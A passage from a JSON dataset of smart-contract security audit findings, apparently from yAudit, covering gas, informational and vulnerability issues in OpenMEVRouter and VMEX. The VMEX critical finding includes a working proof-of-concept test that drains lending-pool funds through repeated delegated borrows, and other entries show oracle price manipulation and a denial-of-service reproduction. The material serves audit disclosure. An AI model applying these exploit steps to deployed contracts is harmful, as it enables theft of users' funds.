        "body": "One instance in _addLiquidity (require(amountAOptimal <= amountADesired);) and another instance in addLiquidityETH (require(IWETH(weth).transfer(pair, amountETH));, which can be replaced with safeTransfer as is done in swapExactETHForTokens).",
        "labels": [
            "yAudit",
            "Severity: Gas",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "17. Remove unused code",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/05-2022-OpenMEVRouter.md",
        "body": "First instance Second instance Third instance",
        "labels": [
            "yAudit",
            "Severity: Gas",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "18. Use simple comparison",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/05-2022-OpenMEVRouter.md",
        "body": "The _addLiquidity() function in OpenMenRouter.sol contains this code: if (amountBOptimal <= amountBDesired) { // require(amountBOptimal >= amountBMin, 'UniswapV2Router: INSUFFICIENT_B_AMOUNT'); if (amountBOptimal < amountBMin) revert InsufficientBAmount(); // revert InsufficientBAmount({ available: amountBOptimal, required: amountBMin }); (amountA, amountB) = (amountADesired, amountBOptimal); } else { uint256 amountAOptimal = OpenMevLibrary.quote(amountBDesired, reserveB, reserveA); require(amountAOptimal <= amountADesired); // require(amountAOptimal >= amountAMin, 'UniswapV2Router: INSUFFICIENT_A_AMOUNT'); if (amountAOptimal < amountAMin) revert InsufficientAAmount(); // revert InsufficientAAmount({ available: amountAOptimal, required: amountAMin }); (amountA, amountB) = (amountAOptimal, amountBDesired); } By switching around the if/else clauses, we can replace the compound operator with a simple one if (amountBOptimal > amountBDesired) { uint256 amountAOptimal = OpenMevLibrary.quote(amountBDesired, reserveB, reserveA); require(amountAOptimal <= amountADesired); // require(amountAOptimal >= amountAMin, 'UniswapV2Router: INSUFFICIENT_A_AMOUNT'); if (amountAOptimal < amountAMin) revert InsufficientAAmount(); // revert InsufficientAAmount({ available: amountAOptimal, required: amountAMin }); (amountA, amountB) = (amountAOptimal, amountBDesired); } else { // require(amountBOptimal >= amountBMin, 'UniswapV2Router: INSUFFICIENT_B_AMOUNT'); if (amountBOptimal < amountBMin) revert InsufficientBAmount(); // revert InsufficientBAmount({ available: amountBOptimal, required: amountBMin }); (amountA, amountB) = (amountADesired, amountBOptimal); } Another instance of this improvement is found with the comparison >= 1. Two other instances of this are in OpenMevLibrary.sol (lines 270 and 331), but to show the example from _swapSupportingFeeOnTransferTokens(): swaps[i].isBackrunable = ((1000 * amountInput) / reserveInput) >= 1; Because >= 1 equates to > 0, and G1 shows how != 0 or _isNonZero() is better than > 0, the comparison can be simplified to swaps[i].isBackrunable = _isNonZero(((1000 * amountInput) / reserveInput));",
        "labels": [
            "yAudit",
            "Severity: Gas",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "19. Combine reserve value checks",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/05-2022-OpenMEVRouter.md",
        "body": "Most places where OpenMevLibrary.getAmountOut() in OpenMevZapper results in duplicated reserve checks.",
        "labels": [
            "yAudit",
            "Severity: Gas",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "20. Use msg global vars directly",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/05-2022-OpenMEVRouter.md",
        "body": "msg.value is unnecessarily cached in: addLiquidityETH() swapETHForExactTokens() swapETHAndStakeLiquidity() msg.value can replace swaps[0].amountIn swapExactETHForTokens() here and here",
        "labels": [
            "yAudit",
            "Severity: Gas",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "21. Remove duplicate internal function call",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/05-2022-OpenMEVRouter.md",
        "body": "One example: First call Second call",
        "labels": [
            "yAudit",
            "Severity: Gas",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "22. deadline special case not aligned with permit",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/05-2022-OpenMEVRouter.md",
        "body": "EIP-2612 text ensure() function",
        "labels": [
            "yAudit",
            "Severity: Gas",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "23. Replace pair.swap() with _asmSwap()",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/05-2022-OpenMEVRouter.md",
        "body": "Line 699 of OpenMEVRouter.sol",
        "labels": [
            "yAudit",
            "Severity: Gas",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "24. Remove a sortTokens call",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/05-2022-OpenMEVRouter.md",
        "body": "The first sortTokens() call The second sortTokens() call happens in pairFor()",
        "labels": [
            "yAudit",
            "Severity: Gas",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "25. Missing curly brace",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/05-2022-OpenMEVRouter.md",
        "body": "This if statement is missing curly braces.",
        "labels": [
            "yAudit",
            "Severity: Gas",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "26. Reduce number of swaps",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/05-2022-OpenMEVRouter.md",
        "body": "Consider the constant product diagram Point 1 shows the liquidity pool amounts before OpenMevRouter interaction, point 2 shows the amounts after the OpenMevRouter user swap, and point 3 shows the amounts after the first backrun of the arb process. These two steps can be combined to arrive from point 1 to point 3, skipping to need to swap to arrive at point 2. The math in OpenMevRouter.sol would need changing, but gas savings from removing one swap may be enough to reduce overall gas consumption.",
        "labels": [
            "yAudit",
            "Severity: Gas",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "27. Revert if zero flashloan profit",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/05-2022-OpenMEVRouter.md",
        "body": "The revert logic for the kashi flashloan callback is currently: if (amountOver < amountOwing) revert InsufficientOutputAmount(); Instead, the revert should also happen on the equality case: if (amountOver <= amountOwing) revert InsufficientOutputAmount(); The same improvement can be made in the Aave flashloan callback.",
        "labels": [
            "yAudit",
            "Severity: Gas",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "28. OpenMevRouter should inherit from IFlashBorrower and IOpenMevRouter",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/05-2022-OpenMEVRouter.md",
        "body": "",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "29. The ETHERSCAN_API key is present in plaintext",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/05-2022-OpenMEVRouter.md",
        "body": "",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "30. SafeTransferLib does not match Solmate's main branch",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/05-2022-OpenMEVRouter.md",
        "body": "",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "31. Incorrect comment",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/05-2022-OpenMEVRouter.md",
        "body": "The comment on line 1001 doesn't match the code in line 1002.",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "32. Replace magic numbers with constants",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/05-2022-OpenMEVRouter.md",
        "body": "There are many instances of the value 1000. Consider replacing this magic number with a constant internal variable named MINIMUM_LIQUIDITY like Uniswap does: First instance Second instance Third instance Fourth instance Fifth instance Other instances of magic numbers are found in calcCoeffs().",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "33. Typos",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/05-2022-OpenMEVRouter.md",
        "body": "First typo Second typo",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "34. Hard coded Aave token list",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/05-2022-OpenMEVRouter.md",
        "body": "The hard coded list of tokens in OpenMevLibrary.sol.",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "35. Inconsistency in WETH transfers",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/05-2022-OpenMEVRouter.md",
        "body": "The one instance of a WETH transfer with require(IWETH(weth).transfer(pair, amount));. All other instances use IWETH(weth).deposit{ value: amount }(); First instance Second instance Third instance",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "36. safeApprove vulnerable to double withdraw",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/05-2022-OpenMEVRouter.md",
        "body": "One relevant safeApprove() call was found. Permit is used in several functions in OpenMevRouter.sol: First function Second function Third function",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "37. Same frontrunning weaknesses as Uniswap/SushiSwap",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/05-2022-OpenMEVRouter.md",
        "body": "Project documentation explaining these attack vectors still remain.",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "38. Kashi flashloanable tokens assumed same as aave",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/05-2022-OpenMEVRouter.md",
        "body": "The logic to backrun a swap happens if either there is sufficient token balance in the router that no flashloan is needed, or the token can be flashloaned from Aave. There is no separate list of Kashi-supported flashloanable tokens. Only a list of Aave flashloanable tokens exists.",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "39.  (engn33r)",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/05-2022-OpenMEVRouter.md",
        "body": "Incorrect comment for add512x512()",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "1. Funds can be drained from the protocol",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2023-VMEX.md",
        "body": "ValidationLogic.sol#L193. In the following POC, an attacker can borrow 100,000 USDC with 10 ETH of collateral with ETH being priced around 270 USD in the tests, that's about 2,700 USDC of collateral. You can run this test in your test suite. import { APPROVAL_AMOUNT_LENDING_POOL, } from \"../../helpers/constants\"; import { convertToCurrencyDecimals, convertToCurrencyUnits } from \"../../helpers/contracts-helpers\"; import { expect } from \"chai\"; import { ethers } from \"ethers\"; import { ProtocolErrors } from \"../../helpers/types\"; import { makeSuite, TestEnv } from \"./helpers/make-suite\"; import { CommonsConfig } from \"../../markets/aave/commons\"; import { getVariableDebtToken } from \"../../helpers/contracts-getters\"; const AAVE_REFERRAL = CommonsConfig.ProtocolGlobalParams.AaveReferral; makeSuite(\"Borrow exploit\", (testEnv: TestEnv) => { it(\"exploit\", async () => { const { users, pool, weth, usdc, oracle } = testEnv; var ethPrice = await oracle.getAssetPrice(weth.address) console.log(\"eth price: \", ethPrice) var usdcPrice = await oracle.getAssetPrice(usdc.address) console.log(\"usdc price: \", usdcPrice) var victims = users[0] var config = await pool.getReserveData(usdc.address, 0) var debtToken = await getVariableDebtToken(config[7]) // Seed 1M in the pool. await usdc .connect(victims.signer) .mint(await convertToCurrencyDecimals(usdc.address, \"1000000\")); await usdc .connect(victims.signer) .approve(pool.address, APPROVAL_AMOUNT_LENDING_POOL); await pool .connect(victims.signer) .deposit( usdc.address, 0, await convertToCurrencyDecimals(usdc.address, \"1000000\"), victims.address, \"0\" ); var attackerAddress0 = users[1] var attackerAddress1 = users[2] await weth .connect(attackerAddress0.signer) .mint(await convertToCurrencyDecimals(weth.address, \"10\")); await weth .connect(attackerAddress0.signer) .approve(pool.address, APPROVAL_AMOUNT_LENDING_POOL); await pool .connect(attackerAddress0.signer) .deposit( weth.address, 0, ethers.utils.parseEther(\"10\"), attackerAddress0.address, \"0\" ); await weth .connect(attackerAddress1.signer) .mint(await convertToCurrencyDecimals(weth.address, \"10\")); await weth .connect(attackerAddress1.signer) .approve(pool.address, APPROVAL_AMOUNT_LENDING_POOL); await pool .connect(attackerAddress1.signer) .deposit( weth.address, 0, ethers.utils.parseEther(\"10\"), attackerAddress1.address, \"0\" ); await debtToken .connect(attackerAddress1.signer) .approveDelegation(attackerAddress0.address, ethers.utils.parseEther(\"1\")) for(var i=0; i<50;i++) { await pool .connect(attackerAddress0.signer) .borrow( usdc.address, 0, await convertToCurrencyDecimals(usdc.address, \"2000\"), AAVE_REFERRAL, attackerAddress1.address ); } var usdcBalance = await usdc.balanceOf(attackerAddress0.address) console.log(\"attacker balance: \", await convertToCurrencyUnits(usdc.address, usdcBalance.toString())) }); });",
        "labels": [
            "yAudit",
            "Severity: Critical",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "2. Tranche admin can DOS their tranche by setting treasury address to address(0)",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2023-VMEX.md",
        "body": "Tranche admins can update their fee address via LendingPoolConfigurator.updateTreasuryAddress(), and there is no check to ensure that the address they set is not address(0). The function ReserveLogic.updateState() is called in nearly all of the protocol's critical functions, including deposit(), withdraw(), repay(), borrowHelper(), and liquidationCall(). The following (abridged) call sequence occurs whenever updateState() is performed: ReserveLogic.updateState() -> ReserveLogic._mintToTreasury() -> AToken.mintToTreasury() -> AToken._mint(): The AToken functions are below: function mintToTreasury(uint256 amount, uint256 index) external override onlyLendingPool { if (amount == 0) { return; } // get tranche admin's fee address from configurator address treasury = ILendingPoolConfigurator(_lendingPoolConfigurator).trancheAdminTreasuryAddresses(_tranche); _mint(treasury, amount.rayDiv(index)); ... } function _mint(address account, uint256 amount) internal virtual { require(account != address(0), \"ERC20: mint to the zero address\"); ... } The require statement in _mint() will cause the state update to revert if the recipient address is 0x0, preventing the protocol from functioning. Note that a global admin can recover the tranche from this state by setting the tranche's treasury address to a valid address (and likely removing the tranche admin). However, this is a manual process and requires the global admin to be aware of the issue and take action. To reproduce this issue, modify helpers/contract-deployment.ts to set treasuryAddress to \"0x0000000000000000000000000000000000000000\" at L237 and L623. Observe that many tests now revert with \"ERC20: mint to the zero address\".",
        "labels": [
            "yAudit",
            "Severity: Critical",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "3. An attacker can DOS users deposits",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2023-VMEX.md",
        "body": "When a user deposits for the first time an asset into a tranche, it will enable the usage as collateral. An attacker could distribute dust to target accounts with deposits to block the user from using it. It will prevent users from using the funds.",
        "labels": [
            "yAudit",
            "Severity: High",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "4. Incorrect Curve oracle reentrancy protection",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2023-VMEX.md",
        "body": "check_reentrancy(): bool success = false; (success,) = curve_pool.call(abi.encodeWithSignature(\"claim_admin_fees()\")); if (!success) { (success,) = ICurvePool(curve_pool).owner().call(abi.encodeWithSignature(\"withdraw_admin_fees()\")); require(success, Errors.VO_REENTRANCY_GUARD_FAIL); } It's a good practice to call to an address via wrapping it an interface instead of low level .call, as .call will always be successful on EOAs. For the Curve pools that don't implement claim_admin_fees() (example: DAI/USDC/USDT pool), withdraw_admin_fees() on owner (example: DAI/USDC/USDT pool's owner) is called. The correct function signature is withdraw_admin_fees(_pool: address). So it will always return false. Hence, if the call goes to the pool owner, it always reverts. This call also puts a lock on the owner contract instead of the pool because DAI/USDC/USDT pool doesn't have a lock on withdraw_admin_fees(). However, this pool is safe from this reentrancy attack as it doesn't use native token. Curve pools with native token have this reentrancy lock (example: ETH/stETH pool), however, older pools may not have this lock or this lock can be missed in error.",
        "labels": [
            "yAudit",
            "Severity: High",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "5. Tranche admin can self-benefit at the expense of users",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2023-VMEX.md",
        "body": "setReserveInterestRateStrategyAddress(), setReserveFactor()",
        "labels": [
            "yAudit",
            "Severity: High",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "6. Incorrect order of arguments in calls to IncentivesController.handleAction()",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2023-VMEX.md",
        "body": "IncentivizedERC20's _mint(), _burn() and _transfer() function calls to handleAction(address user, uint256 userBalance, uint256 totalSupply) incorrectly. Consider _transfer(): uint256 currentTotalSupply = _totalSupply; _getIncentivesController().handleAction(sender, currentTotalSupply, oldSenderBalance); if (sender != recipient) { _getIncentivesController().handleAction(recipient, currentTotalSupply, oldRecipientBalance); } Notice that currentTotalSupply and oldSenderBalance are swapped.",
        "labels": [
            "yAudit",
            "Severity: High",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "7. No access control on setIncentivesController()",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2023-VMEX.md",
        "body": "LendingPoolAddressesProvider.sol#L486 function setIncentivesController(address incentives) external override { _addresses[INCENTIVES_CONTROLLER] = incentives; emit IncentivesControllerUpdated(incentives); }",
        "labels": [
            "yAudit",
            "Severity: High",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "8. User validation uses outdated protocol state",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2023-VMEX.md",
        "body": "The validateBorrow() function is one of the most crucial functions for ensuring that users do not exceed their margin requirements when attempting to borrow funds. The implementation of this function is incorrect, as it uses outdated values to perform the margin check and updates the protocol state only after the validation has taken place. ValidationLogic.validateBorrow(...) reserve.updateState(...); Within the updateState() function both the interest earned and interest owed are updated. As the update process occurs after user input validation, any pending interest payments are ignored.",
        "labels": [
            "yAudit",
            "Severity: High",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "9. Incorrect balancer LP price decimals",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2023-VMEX.md",
        "body": "In BalancerOracle.calc_balancer_lp_price() the price is calculated as: return ((fairResA * pxA) + (fairResB * pxB)) / supply; Assume that the pool weights are (0.5, 0.5). Then the price decimals are: (dA + dB)/2 - BPT_decimals + oracle_decimals = (dA + dB)/2 - 18 + 8 Where dA and dB are the decimals of tokens A and B respectively. This is correct only if dA + dB = 36. For example if tokens A and B have both 18 decimals then the LP price will have 8 decimals as the oracle, which is correct. computeFairReserves() is commented in the following with the decimals for each variable, showing that fair reserves have (dA + dB)/2 decimals function computeFairReserves( ... uint r0 = BNum.bdiv(resA, resB); // @audit dA - dB + 18 uint r1 = BNum.bdiv(BNum.bmul(wA, pxB), BNum.bmul(wB, pxA)); // @audit 18 // fairResA = resA * (r1 / r0) ^ wB // fairResB = resB * (r0 / r1) ^ wA if (r0 > r1) { uint ratio = BNum.bdiv(r1, r0); // @audit 18 - (dA - dB + 18) + 18 = dB - dA + 18 fairResA = BNum.bmul(resA, BNum.bpow(ratio, wB)); // @audit dA + ((dB - dA + 18 - 18)/2 + 18) - 18 = (dB + dA)/2 fairResB = BNum.bdiv(resB, BNum.bpow(ratio, wA)); // @audit dB - ((dB - dA + 18 - 18)/2 + 18) + 18 = (dB + dA)/2 } else { uint ratio = BNum.bdiv(r0, r1); // @audit dA + 18 - dB fairResA = BNum.bdiv(resA, BNum.bpow(ratio, wB)); // @audit dA - ((dA + 18 - dB - 18)/2 + 18) + 18 = (dB + dA)/2 fairResB = BNum.bmul(resB, BNum.bpow(ratio, wA)); // @audit dB + ((dA + 18 - dB - 18)/2 + 18) - 18 = (dB + dA)/2 } } Note also that, again because resA and resB have the respective tokens decimals, the ratio can be much smaller than 18. This will cause rounding errors in BNum.bpow(ratio, wB) as discussed in a separate finding.",
        "labels": [
            "yAudit",
            "Severity: High",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "10. Excessive timeframe could lead to stale Chainlink oracle prices",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2023-VMEX.md",
        "body": "The getOracleAssetPrice() function uses Chainlink price feed's latestRoundData() function in order to obtain a price for the asset. latestRoundData() also returns updatedAt which is the timestamp at which the price was reported to Chainlink. A time duration threshold can be used against updatedAt to either accept or reject the price. VMEX does this, and allows a maximum timeframe of SECONDS_PER_DAY in order to consider the price not stale: function getOracleAssetPrice(address asset) internal returns (uint256){ ... ( /* uint80 roundID */, int256 price, /*uint startedAt*/, uint256 updatedAt, /*uint80 answeredInRound*/ ) = IChainlinkPriceFeed(source).latestRoundData(); IChainlinkAggregator aggregator = IChainlinkAggregator(IChainlinkPriceFeed(source).aggregator()); if (price > int256(aggregator.minAnswer()) && price < int256(aggregator.maxAnswer()) && block.timestamp - updatedAt < SECONDS_PER_DAY) { return uint256(price); } ... } 1 day is a good enough check for stablecoins but volatile assets, Chainlink has a much shorter price refresh period (called heartbeat). For example, LINK/USD oracle on Optimism has a heartbeat of 1200 seconds. Hence, despite this check, Vmex will continue accepting a stale price if Chainlink fails to report it within the shorter heartbeat.",
        "labels": [
            "yAudit",
            "Severity: Medium",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "11. Velo LP price can be manipulated to liquidate",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2023-VMEX.md",
        "body": "The initial state of the LP: weth/USDC pair: `0x79c912FEF520be002c2B6e57EC4324e260f38E50` Total supply = 112602391366085351 reserveA uint256 : 4908868931818 * 10**18 / 10**6 (USDC) reserveB uint256 : 2583875906785643384998 * 10**18 / 10**18 (WETH) sqrt(4.9088689e+24 * 2583875906785643384998) = 1.1262286e+23 prices: USDC = 100000000 WETH = 191007000000 sqrt(100000000 * 191007000000) = 4370434760 LP price = 2 * 1.1262286e+23 * 4370434760 / 112602391366085351 = 8.7424584e+15 So we have an LP price of 87,424,584 USD The attacker proceeds to take a loan and swaps 50,000 WETH for USDC. weth/USDC pair: `0x79c912FEF520be002c2B6e57EC4324e260f38E50` Total supply = 112602391366085351 (unchanged)/ reserveA uint256 : (4908868931818 - 4695363000000) * 10**18 / 10**6 (USDC) reserveB uint256 : (2583875906785643384998 + 50000 * 10**18) * 10**18 / 10**18 (WETH) sqrt(5.2583876e+22 * 2.1350593e+23) = 1.0595739e+23 prices: USDC = 100000000 WETH = 191007000000 sqrt(100000000 * 191007000000) = 4370434760 LP price = 2 * 1.0595739e+23 * 4370434760 / 112602391366085351 = 8.2250449e+15 So we have an LP price of 82,250,448 USD In this example, the LP price has now decreased by 6%. The attacker must liquidate accounts, requiring around 50 ETH to cover the swap cost for this particular pool. However, this amount can vary significantly based on the pool's liquidity.",
        "labels": [
            "yAudit",
            "Severity: Medium",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "12. borrowFactor can be less than 100%",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2023-VMEX.md",
        "body": "setBorrowingEnabled() validateCollateralParams()",
        "labels": [
            "yAudit",
            "Severity: Medium",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "13. Usage of transferFrom() instead of safeTransferFrom()",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2023-VMEX.md",
        "body": "This issue can be found here: IncentivesController.sol#L159, IncentivesController.sol#L193",
        "labels": [
            "yAudit",
            "Severity: Medium",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "14. Oracle pricing for stable coins LP will trigger liquidation earlier than expected",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2023-VMEX.md",
        "body": "With a stable coin unpeg, on the LP pools, the price of the entire assets used to price the pool is the lowest of the three assets in the pool. In case of a USDC-USDT pool properly balanced 50-50 if one of the assets unpeg to 0.9 a user that has deposited 100 USD worth of assets prior to unpeg will have his deposits valued at 90 USD instead of 95 USD reducing his collateral value and resulting in a potential liquidation/loss./ This pattern can be found in the following two oracles: BalancerOracle.sol#L139 CurveOracle.sol#L36",
        "labels": [
            "yAudit",
            "Severity: Medium",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "15. Blacklist/Whitelist does not behave as expected and tranche admins can block all transfers",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2023-VMEX.md",
        "body": "AToken._transfer() calls LendingPool.finalizeTransfer() which internally calls checkWhitelistBlacklist() to check if both the msg.sender and the token receiver are whitelisted/blacklisted for the respective tranche. In the context of this call however, msg.sender is the aToken contract, rather than the transfer's from address. Accordingly, even if a token sender is blacklisted (or non-whitelisted), they will still be able to transfer their tokens to a new address as the from address is never checked. Afterwards, the receiving address will be able to freely interact with the protocol (in the blacklist case; if the new address is not on the whitelist they will still be blocked from deposit/borrowing). Similarly, a tranche admin can block all aToken transfers for their tranche by either: Adding the aToken's address to the blacklist Enabling the whitelist Note that even if a tranche admin blocks transfers, users will still be able to withdraw their funds directly from the system. However, if they are using their aTokens with a different protocol (e.g. depositing them in yield farm or using them as collateral for a loan elsewhere), they will not be able to remove their tokens from the outside protocol to withdraw from VMEX. LendingPool.sol (_checkWhitelistBlacklist(), finalizeTransfer()): // @audit \"user\" is always either msg.sender or \"to\" address; never the token transfer's \"from\". function _checkWhitelistBlacklist(uint64 trancheId, address user) internal view { if (trancheParams[trancheId].isUsingWhitelist) { require( _usersConfig[user][trancheId].configuration.getWhitelist(), Errors.LP_NOT_WHITELISTED_TRANCHE_PARTICIPANT ); } require(!_usersConfig[user][trancheId].configuration.getBlacklist(), Errors.LP_BLACKLISTED_TRANCHE_PARTICIPANT); } function checkWhitelistBlacklist(uint64 trancheId, address onBehalfOf) internal view { _checkWhitelistBlacklist(trancheId, msg.sender); if (onBehalfOf != msg.sender) { _checkWhitelistBlacklist(trancheId, onBehalfOf); } } ... // @audit this is called from the aToken contract in AToken._transfer() function finalizeTransfer( address asset, uint64 trancheId, address from, address to, uint256 amount, uint256 balanceFromBefore, uint256 balanceToBefore ) external override whenTrancheNotPausedAndExists(trancheId) { require(msg.sender == _reserves[asset][trancheId].aTokenAddress, Errors.LP_CALLER_MUST_BE_AN_ATOKEN); // @audit The \"from\" address is not passed to this check. By blacklisted (or not whitelisting) // the aToken address, a tranche admin can cause this to always revert. checkWhitelistBlacklist(trancheId, to); ... } AToken._transfer(): function _transfer(address from, address to, uint256 amount, bool validate) internal { address underlyingAsset = _underlyingAsset; ILendingPool pool = _pool; ... // @audit \"validate\" is true for standard transfer() and transferFrom() calls; not on liquidations if (validate) { pool.finalizeTransfer( underlyingAsset, _tranche, from, to, amount, fromBalanceBefore, toBalanceBefore ); }",
        "labels": [
            "yAudit",
            "Severity: Medium",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "16. nthroot() should use established libraries for calculating roots",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2023-VMEX.md",
        "body": "nthroot(): function nthroot(uint8 n, uint256 _product) internal pure returns (uint256) { //VMEX empirically checked that this is only accurate for square roots and cube roots, // and the decimals are 9 and 12 respectively if (n == 2) { return LogExpMath.pow(_product, 1e18 / n) / 1e9; } if (n == 3) { return LogExpMath.pow(_product, 1e18 / n) / 1e12; } revert(\"Balancer math only can handle square roots and cube roots\"); } nthroot() also reverts for high values like 57896044618658097711785492504343953926634992332820282019728792003956564819968. It should not be achievable but the alternatives accommodate these values too.",
        "labels": [
            "yAudit",
            "Severity: Low",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "17. Protocol should only choose a single asset denomination for all tranches",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2023-VMEX.md",
        "body": "On ETH mainnet, you can have prices denominated in ETH or USD value. see: https://data.chain.link/ethereum/mainnet/crypto-eth and https://data.chain.link/ethereum/mainnet/crypto-usd VMEXOracle.sol#L96",
        "labels": [
            "yAudit",
            "Severity: Low",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "18. Asset mapping might not be set and should be checked to be non-zero",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2023-VMEX.md",
        "body": "LendingPool.sol#L109",
        "labels": [
            "yAudit",
            "Severity: Low",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "19. finalizeTransfer() and liquidationCall() auto-enables collateral for receiver",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2023-VMEX.md",
        "body": "DepositWithdrawLogic.sol#L80 does this if the asset is enabled as collateral in reserve data: if (isFirstDeposit) { // if collateral is enabled, by default the user's deposit is marked as collateral user.setUsingAsCollateral(self.id, self.configuration.getCollateralEnabled(vars.asset, vars._assetMappings)); } LendingPool.sol#L645 and LendingPoolCollateralManager.sol#L237-L239 always sets it to true: if (balanceToBefore == 0 && amount != 0) { DataTypes.UserConfigurationMap storage toConfig = _usersConfig[to][trancheId].configuration; toConfig.setUsingAsCollateral(reserveId, true); emit ReserveUsedAsCollateralEnabled(asset, trancheId, to); } liquidatorConfig.setUsingAsCollateral( collateralReserve.id, true ); This can be made consistent to always use getCollateralEnabled() so that an invalid state never enters the protocol.",
        "labels": [
            "yAudit",
            "Severity: Low",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "20. Remove the special treatment of type(uint256).max in validateBorrow()",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2023-VMEX.md",
        "body": "ValidationLogic.sol#L176-L202",
        "labels": [
            "yAudit",
            "Severity: Low",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "21. Check if asset has been added before setting its parameters",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2023-VMEX.md",
        "body": "setVMEXReserveFactor() and setBorrowingEnabled() don't validate that the asset has already been added.",
        "labels": [
            "yAudit",
            "Severity: Low",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "22. Use OZ SafeCast",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2023-VMEX.md",
        "body": "AssetMappings.sol#L275-L278 can silently overflow uint64's max value.",
        "labels": [
            "yAudit",
            "Severity: Low",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "23. registerAddressesProvider() doesn't check if a provider is already registered",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2023-VMEX.md",
        "body": "If registerAddressesProvider() can be called twice on the same provider with different ids. The second call will overwrite _addressesProviders[provider].",
        "labels": [
            "yAudit",
            "Severity: Low",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "24. checkAmount() can overflow",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2023-VMEX.md",
